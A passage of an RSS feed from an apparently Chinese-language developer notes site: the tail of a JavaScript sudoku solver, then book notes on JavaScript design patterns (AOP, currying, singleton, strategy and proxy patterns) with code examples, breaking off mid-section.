    <span>!</span><span>usedInBox</span><span>(</span>matrix<span>,</span> row <span>-</span> <span>(</span>row <span>%</span> <span>3</span><span>)</span><span>,</span> col <span>-</span> <span>(</span>col <span>%</span> <span>3</span><span>)</span><span>,</span> num<span>)</span>
  <span>)</span>
<span>}</span>

<span>function</span> <span>usedInRow</span><span>(</span><span>matrix<span>,</span> row<span>,</span> num</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>let</span> col <span>=</span> <span>0</span><span>;</span> col <span>&lt;</span> matrix<span>.</span>length<span>;</span> col<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>matrix<span>[</span>row<span>]</span><span>[</span>col<span>]</span> <span>===</span> num<span>)</span> <span>{</span>
      <span>return</span> <span>true</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>false</span>
<span>}</span>

<span>function</span> <span>usedInCol</span><span>(</span><span>matrix<span>,</span> col<span>,</span> num</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>let</span> row <span>=</span> <span>0</span><span>;</span> row <span>&lt;</span> matrix<span>.</span>length<span>;</span> row<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>matrix<span>[</span>row<span>]</span><span>[</span>col<span>]</span> <span>===</span> num<span>)</span> <span>{</span>
      <span>return</span> <span>true</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>false</span>
<span>}</span>

<span>function</span> <span>usedInBox</span><span>(</span><span>matrix<span>,</span> boxStartRow<span>,</span> boxStartCol<span>,</span> num</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>let</span> row <span>=</span> <span>0</span><span>;</span> row <span>&lt;</span> <span>3</span><span>;</span> row<span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> col <span>=</span> <span>0</span><span>;</span> col <span>&lt;</span> <span>3</span><span>;</span> col<span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>matrix<span>[</span>row <span>+</span> boxStartRow<span>]</span><span>[</span>col <span>+</span> boxStartCol<span>]</span> <span>===</span> num<span>)</span> <span>{</span>
        <span>return</span> <span>true</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>false</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>JavaScript DOM 编程艺术（第二版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-DOM/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-DOM/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript DOM 编程艺术（第二版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>JavaScript 设计模式与开发实践</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-Design-Develop/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-Design-Develop/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 设计模式与开发实践</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-高阶函数实现-aop"> 1. 高阶函数实现 AOP</h2>
<div><pre><code><span>Function</span><span>.</span>prototype<span>.</span><span>before</span> <span>=</span> <span>function</span><span>(</span><span>beforefn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span> <span>// 保存原函数的引用</span>
  <span>// 返回包含了原函数和新函数的"代理"函数</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>beforefn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>// 执行新函数，修正 this</span>
    <span>return</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span> <span>// 执行原函数</span>
  <span>}</span>
<span>}</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>after</span> <span>=</span> <span>function</span><span>(</span><span>afterfn</span><span>)</span> <span>{</span>
  <span>var</span> __self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> ret <span>=</span> <span>__self</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>afterfn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span>
    <span>return</span> ret
  <span>}</span>
<span>}</span>
<span>var</span> <span>func</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>2</span><span>)</span>
<span>}</span>
func <span>=</span> func
  <span>.</span><span>before</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>1</span><span>)</span>
  <span>}</span><span>)</span>
  <span>.</span><span>after</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>3</span><span>)</span>
  <span>}</span><span>)</span>
<span>func</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><h2 id="_2-高阶函数的其他应用"> 2. 高阶函数的其他应用</h2>
<ul>
<li>currying 函数柯里化（柯里化，可以理解为提前接收部分参数，延迟执行，不立即输出结果，而是返回一个接受剩余参数的函数。因为这样的特性，也被称为部分计算函数。柯里化，是一个逐步接收参数的过程）。</li>
</ul>
<div><pre><code><span>var</span> <span>currying</span> <span>=</span> <span>function</span><span>(</span><span>fn</span><span>)</span> <span>{</span>
  <span>var</span> args <span>=</span> <span>[</span><span>]</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>arguments<span>.</span>length <span>===</span> <span>0</span><span>)</span> <span>{</span>
      <span>return</span> <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> args<span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>;</span><span>[</span><span>]</span><span>.</span><span>push</span><span>.</span><span>apply</span><span>(</span>args<span>,</span> arguments<span>)</span>
      <span>return</span> arguments<span>.</span>callee
    <span>}</span>
  <span>}</span>
<span>}</span>
<span>var</span> cost <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> money <span>=</span> <span>0</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>,</span> l <span>=</span> arguments<span>.</span>length<span>;</span> i <span>&lt;</span> l<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      money <span>+=</span> arguments<span>[</span>i<span>]</span>
    <span>}</span>
    <span>return</span> money
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>
<span>var</span> cost <span>=</span> <span>currying</span><span>(</span>cost<span>)</span> <span>// 转化成 currying 函数</span>
<span>cost</span><span>(</span><span>100</span><span>)</span> <span>// 未真正求值</span>
<span>cost</span><span>(</span><span>200</span><span>)</span> <span>// 未真正求值</span>
<span>cost</span><span>(</span><span>300</span><span>)</span> <span>// 未真正求值</span>
<span>alert</span><span>(</span><span>cost</span><span>(</span><span>)</span><span>)</span> <span>// 求值并输出：600</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><ul>
<li>uncurrying 反柯里化（反柯里化，是一个泛型化的过程。它使得被反柯里化的函数，可以接收更多参数。目的是创建一个更普适性的函数，可以被不同的对象使用。有鸠占鹊巢的效果）。</li>
</ul>
<div><pre><code><span>// JavaScript 之父 Brendan Eich</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>uncurrying</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> obj <span>=</span> <span>Array</span><span>.</span>prototype<span>.</span><span>shift</span><span>.</span><span>call</span><span>(</span>arguments<span>)</span>
    <span>return</span> <span>self</span><span>.</span><span>apply</span><span>(</span>obj<span>,</span> arguments<span>)</span>
  <span>}</span>
<span>}</span>

<span>// 另一种实现方式</span>
<span>Function</span><span>.</span>prototype<span>.</span><span>uncurrying</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> self <span>=</span> <span>this</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>Function</span><span>.</span>prototype<span>.</span><span>call</span><span>.</span><span>apply</span><span>(</span>self<span>,</span> arguments<span>)</span>
  <span>}</span>
<span>}</span>

<span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>,</span> fn<span>,</span> ary <span>=</span> <span>[</span><span>'push'</span><span>,</span> <span>'shift'</span><span>,</span> <span>'forEach'</span><span>]</span><span>;</span> <span>(</span>fn <span>=</span> ary<span>[</span>i<span>++</span><span>]</span><span>)</span><span>;</span> <span>)</span> <span>{</span>
  Array<span>[</span>fn<span>]</span> <span>=</span> <span>Array</span><span>.</span>prototype<span>[</span>fn<span>]</span><span>.</span><span>uncurrying</span><span>(</span><span>)</span>
<span>}</span>
<span>var</span> obj <span>=</span> <span>{</span>
  <span>length</span><span>:</span> <span>3</span><span>,</span>
  <span>'0'</span><span>:</span> <span>1</span><span>,</span>
  <span>'1'</span><span>:</span> <span>2</span><span>,</span>
  <span>'2'</span><span>:</span> <span>3</span><span>,</span>
<span>}</span>
Array<span>.</span><span>push</span><span>(</span>obj<span>,</span> <span>4</span><span>)</span> <span>// 向对象中添加一个元素</span>
console<span>.</span><span>log</span><span>(</span>obj<span>.</span>length<span>)</span> <span>// 输出：4</span>
<span>var</span> first <span>=</span> Array<span>.</span><span>shift</span><span>(</span>obj<span>)</span> <span>// 截取第一个元素</span>
console<span>.</span><span>log</span><span>(</span>first<span>)</span> <span>// 输出：1</span>
console<span>.</span><span>log</span><span>(</span>obj<span>)</span> <span>// 输出：{0: 2, 1: 3, 2: 4, length: 3}</span>
Array<span>.</span><span>forEach</span><span>(</span>obj<span>,</span> <span>function</span><span>(</span><span>i<span>,</span> n</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>n<span>)</span> <span>// 分别输出：0, 1, 2</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><h2 id="_3-单例模式"> 3. 单例模式</h2>
<ul>
<li>单例模式的定义是：保证一个类仅有一个实例，并提供一个访问它的全局访问点。</li>
</ul>
<div><pre><code><span>// 示例一</span>
<span>var</span> <span>Singleton</span> <span>=</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
  <span>this</span><span>.</span>instance <span>=</span> <span>null</span>
<span>}</span>
<span>Singleton</span><span>.</span>prototype<span>.</span><span>getName</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>this</span><span>.</span>name<span>)</span>
<span>}</span>
Singleton<span>.</span><span>getInstance</span> <span>=</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>instance<span>)</span> <span>{</span>
    <span>this</span><span>.</span>instance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span>name<span>)</span>
  <span>}</span>
  <span>return</span> <span>this</span><span>.</span>instance
<span>}</span>

<span>var</span> a <span>=</span> Singleton<span>.</span><span>getInstance</span><span>(</span><span>'sven1'</span><span>)</span>
<span>var</span> b <span>=</span> Singleton<span>.</span><span>getInstance</span><span>(</span><span>'sven2'</span><span>)</span>
<span>alert</span><span>(</span>a <span>===</span> b<span>)</span> <span>// true</span>

<span>// 示例二（增加不透明性）</span>
<span>var</span> <span>Singleton</span> <span>=</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>name <span>=</span> name
<span>}</span>
<span>Singleton</span><span>.</span>prototype<span>.</span><span>getName</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>alert</span><span>(</span><span>this</span><span>.</span>name<span>)</span>
<span>}</span>
Singleton<span>.</span>getInstance <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> instance <span>=</span> <span>null</span>
  <span>return</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>instance<span>)</span> <span>{</span>
      instance <span>=</span> <span>new</span> <span>Singleton</span><span>(</span>name<span>)</span>
    <span>}</span>
    <span>return</span> instance
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>

<span>var</span> a <span>=</span> Singleton<span>.</span><span>getInstance</span><span>(</span><span>'sven1'</span><span>)</span>
<span>var</span> b <span>=</span> Singleton<span>.</span><span>getInstance</span><span>(</span><span>'sven2'</span><span>)</span>
<span>alert</span><span>(</span>a <span>===</span> b<span>)</span> <span>// true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div><h2 id="_4-惰性单例"> 4. 惰性单例</h2>
<ul>
<li>结合闭包，惰性创建唯一节点。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>body</span><span>></span></span>
  <span><span><span>&lt;</span>button</span> <span>id</span><span><span>=</span><span>"</span>loginBtn<span>"</span></span><span>></span></span>登录<span><span><span>&lt;/</span>button</span><span>></span></span>
<span><span><span>&lt;/</span>body</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>var</span> createLoginLayer <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> div
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>div<span>)</span> <span>{</span>
      div <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>)</span>
      div<span>.</span>innerHTML <span>=</span> <span>'我是登录浮窗'</span>
      div<span>.</span>style<span>.</span>display <span>=</span> <span>'none'</span>
      document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>div<span>)</span>
    <span>}</span>
    <span>return</span> div
  <span>}</span>
<span>}</span><span>)</span><span>(</span><span>)</span>

document<span>.</span><span>getElementById</span><span>(</span><span>'loginBtn'</span><span>)</span><span>.</span><span>onclick</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> loginLayer <span>=</span> <span>createLoginLayer</span><span>(</span><span>)</span>
  loginLayer<span>.</span>style<span>.</span>display <span>=</span> <span>'block'</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_5-通用的惰性单例"> 5. 通用的惰性单例</h2>
<ul>
<li>
<p>上一节我们完成了一个可用的惰性单例，但是我们发现它还有如下一些问题。</p>
<blockquote>
<ul>
<li>这段代码仍然是违反单一职责原则的，创建对象和管理单例的逻辑都放在 createLoginLayer 对象内部。</li>
<li>如果我们下次需要创建页面中唯一的 iframe ，或者 script 标签，用来跨域请求数据，就必须得如法炮制，把 createLoginLayer 函数几乎照抄一遍。</li>
</ul>
</blockquote>
</li>
<li>
<p>通用的惰性单例。</p>
</li>
</ul>
<div><pre><code><span>var</span> <span>getSingle</span> <span>=</span> <span>function</span><span>(</span><span>fn</span><span>)</span> <span>{</span>
  <span>var</span> result
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> result <span>||</span> <span>(</span>result <span>=</span> <span>fn</span><span>.</span><span>apply</span><span>(</span><span>this</span><span>,</span> arguments<span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>var</span> <span>createLoginLayer</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> div <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'div'</span><span>)</span>
  div<span>.</span>innerHTML <span>=</span> <span>'我是登录浮窗'</span>
  div<span>.</span>style<span>.</span>display <span>=</span> <span>'none'</span>
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>div<span>)</span>
  <span>return</span> div
<span>}</span>

<span>var</span> createSingleLoginLayer <span>=</span> <span>getSingle</span><span>(</span>createLoginLayer<span>)</span>

document<span>.</span><span>getElementById</span><span>(</span><span>'loginBtn'</span><span>)</span><span>.</span><span>onclick</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> loginLayer <span>=</span> <span>createSingleLoginLayer</span><span>(</span><span>)</span>
  loginLayer<span>.</span>style<span>.</span>display <span>=</span> <span>'block'</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h2 id="_6-策略模式"> 6. 策略模式</h2>
<ul>
<li>
<p>策略模式的定义是：定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换。</p>
<blockquote>
<p>“并且使它们可以相互替换”，这句话在很大程度上是相对于静态类型语言而言的。因为静态类型语言中有类型检查机制，所以各个策略类需要实现同样的接口。当它们的真正类型被隐藏在接口后面时，它们才能被相互替换。而在 JavaScript 这种 “类型模糊” 的语言中没有这种困扰，任何对象都可以被替换使用。因此，JavaScript 中的 “可以相互替换使用” 表现为它们具有相同的目标和意图。</p>
</blockquote>
</li>
<li>
<p>一个基于策略模式的程序至少由两部分组成。第一个部分是一组策略类，策略类封装了具体的算法，并负责具体的计算过程。第二个部分是环境类 Context，Context 接受客户的请求，随后把请求委托给某一个策略类。要做到这点，说明 Context 中要维持对某个策略对象的引用。</p>
</li>
</ul>
<div><pre><code><span>// 策略类</span>
<span>var</span> <span>performanceS</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
performanceS<span>.</span>prototype<span>.</span><span>calculate</span> <span>=</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
  <span>return</span> salary <span>*</span> <span>4</span>
<span>}</span>
<span>var</span> <span>performanceA</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
performanceA<span>.</span>prototype<span>.</span><span>calculate</span> <span>=</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
  <span>return</span> salary <span>*</span> <span>3</span>
<span>}</span>
<span>var</span> <span>performanceB</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
performanceB<span>.</span>prototype<span>.</span><span>calculate</span> <span>=</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
  <span>return</span> salary <span>*</span> <span>2</span>
<span>}</span>

<span>// 环境类</span>
<span>var</span> <span>Bonus</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>salary <span>=</span> <span>null</span> <span>// 原始工资</span>
  <span>this</span><span>.</span>strategy <span>=</span> <span>null</span> <span>// 绩效等级对应的策略对象</span>
<span>}</span>
<span>Bonus</span><span>.</span>prototype<span>.</span><span>setSalary</span> <span>=</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>salary <span>=</span> salary <span>// 设置员工的原始工资</span>
<span>}</span>
<span>Bonus</span><span>.</span>prototype<span>.</span><span>setStrategy</span> <span>=</span> <span>function</span><span>(</span><span>strategy</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>strategy <span>=</span> strategy <span>// 设置员工绩效等级对应的策略对象</span>
<span>}</span>
<span>Bonus</span><span>.</span>prototype<span>.</span><span>getBonus</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
  <span>// 取得奖金数额</span>
  <span>return</span> <span>this</span><span>.</span>strategy<span>.</span><span>calculate</span><span>(</span><span>this</span><span>.</span>salary<span>)</span> <span>// 把计算奖金的操作委托给对应的策略对象</span>
<span>}</span>

<span>var</span> bonus <span>=</span> <span>new</span> <span>Bonus</span><span>(</span><span>)</span>
bonus<span>.</span><span>setSalary</span><span>(</span><span>10000</span><span>)</span>
bonus<span>.</span><span>setStrategy</span><span>(</span><span>new</span> <span>performanceS</span><span>(</span><span>)</span><span>)</span> <span>// 设置策略对象</span>
console<span>.</span><span>log</span><span>(</span>bonus<span>.</span><span>getBonus</span><span>(</span><span>)</span><span>)</span> <span>// 输出：40000</span>
bonus<span>.</span><span>setStrategy</span><span>(</span><span>new</span> <span>performanceA</span><span>(</span><span>)</span><span>)</span> <span>// 设置策略对象</span>
console<span>.</span><span>log</span><span>(</span>bonus<span>.</span><span>getBonus</span><span>(</span><span>)</span><span>)</span> <span>// 输出：30000</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><h2 id="_7-javascript-版本的策略模式"> 7. JavaScript 版本的策略模式</h2>
<div><pre><code><span>var</span> strategies <span>=</span> <span>{</span>
  <span>S</span><span>:</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
    <span>return</span> salary <span>*</span> <span>4</span>
  <span>}</span><span>,</span>
  <span>A</span><span>:</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
    <span>return</span> salary <span>*</span> <span>3</span>
  <span>}</span><span>,</span>
  <span>B</span><span>:</span> <span>function</span><span>(</span><span>salary</span><span>)</span> <span>{</span>
    <span>return</span> salary <span>*</span> <span>2</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> <span>calculateBonus</span> <span>=</span> <span>function</span><span>(</span><span>level<span>,</span> salary</span><span>)</span> <span>{</span>
  <span>return</span> strategies<span>[</span>level<span>]</span><span>(</span>salary<span>)</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>calculateBonus</span><span>(</span><span>'S'</span><span>,</span> <span>20000</span><span>)</span><span>)</span> <span>// 输出：80000</span>
console<span>.</span><span>log</span><span>(</span><span>calculateBonus</span><span>(</span><span>'A'</span><span>,</span> <span>10000</span><span>)</span><span>)</span> <span>// 输出：30000</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_8-策略模式的优缺点"> 8. 策略模式的优缺点</h2>
<ul>
<li>
<p>优点。</p>
<ol>
<li>策略模式利用组合、委托和多态等技术和思想，可以有效地避免多重条件选择语句。</li>
<li>策略模式提供了对开放—封闭原则的完美支持，将算法封装在独立的 strategy 中，使得它们易于切换，易于理解，易于扩展。</li>
<li>策略模式中的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作。</li>
<li>在策略模式中利用组合和委托来让 Context 拥有执行算法的能力，这也是继承的一种更轻便的替代方案。</li>
</ol>
</li>
<li>
<p>当然，策略模式也有一些缺点，但这些缺点并不严重。</p>
</li>
</ul>
<h2 id="_9-一等函数对象与策略模式"> 9. 一等函数对象与策略模式</h2>
<ul>
<li>Peter Norvig 在他的演讲中曾说过：“在函数作为一等对象的语言中，策略模式是隐形的。strategy 就是值为函数的变量。” 在 JavaScript 中，除了使用类来封装算法和行为之外，使用函数当然也是一种选择。这些 “算法” 可以被封装到函数中并且四处传递，也就是我们常说的 “高阶函数”。实际上在 JavaScript 这种将函数作为一等对象的语言里，策略模式已经融入到了语言本身当中，我们经常用高阶函数来封装不同的行为，并且把它传递到另一个函数中。当我们对这些函数发出 “调用” 的消息时，不同的函数会返回不同的执行结果。在 JavaScript 中，“函数对象的多态性” 来得更加简单。</li>
</ul>
<h2 id="_10-代理模式"> 10. 代理模式</h2>
<ul>
<li>代理模式是为一个对象提供一个代用品或占位符，以便控制对它的访问。</li>
</ul>
<div><pre><code><span>// 小明让B代理对女神（A）送花</span>
<span>var</span> <span>Flower</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>var</span> xiaoming <span>=</span> <span>{</span>
  <span>sendFlower</span><span>:</span> <span>function</span><span>(</span><span>target</span><span>)</span> <span>{</span>
    <span>var</span> flower <span>=</span> <span>new</span> <span>Flower</span><span>(</span><span>)</span>
    target<span>.</span><span>receiveFlower</span><span>(</span>flower<span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> <span>B</span> <span>=</span> <span>{</span>
  <span>receiveFlower</span><span>:</span> <span>function</span><span>(</span><span>flower</span><span>)</span> <span>{</span>
    <span>A</span><span>.</span><span>receiveFlower</span><span>(</span>flower<span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
<span>var</span> <span>A</span> <span>=</span> <span>{</span>
  <span>receiveFlower</span><span>:</span> <span>function</span><span>(</span><span>flower</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'收到花 '</span> <span>+</span> flower<span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
xiaoming<span>.</span><span>sendFlower</span><span>(</span><span>B</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h2 id="_11-保护代理和虚拟代理"> 11. 保护代理和虚拟代理</h2>
<ul>
<li>
<p>虽然这只是个虚拟的例子，但我们可以从中找到两种代理模式的身影。代理 B 可以帮助 A 过滤掉一些请求，比如送花的人中年龄太大的或者没有宝马的，这种请求就可以直接在代理 B 处被拒绝掉。这种代理叫作保护代理。A 和 B 一个充当白脸，一个充当黑脸。白脸 A 继续保持良好的女神形象，不希望直接拒绝任何人，于是找了黑脸 B 来控制对 A 的访问。</p>
</li>
<li>
